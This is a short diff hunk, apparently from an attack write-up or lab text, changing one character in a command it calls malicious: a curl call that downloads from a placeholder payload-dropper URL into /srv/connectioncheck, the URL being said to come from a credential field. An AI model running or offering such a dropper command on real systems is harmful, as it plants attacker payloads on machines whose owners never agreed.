@@ -1,6 +1,6 @@
 The malicious command we want to execute is:
 
-curl PAYLOADDROPPERURL --output /srv/connectioncheck
+curl PAYLOADDROPPERURL –output /srv/connectioncheck
 
 Where PAYLOADDROPPERURL is the value found in FSSPayloadDropperUrl in the credential field below.
 
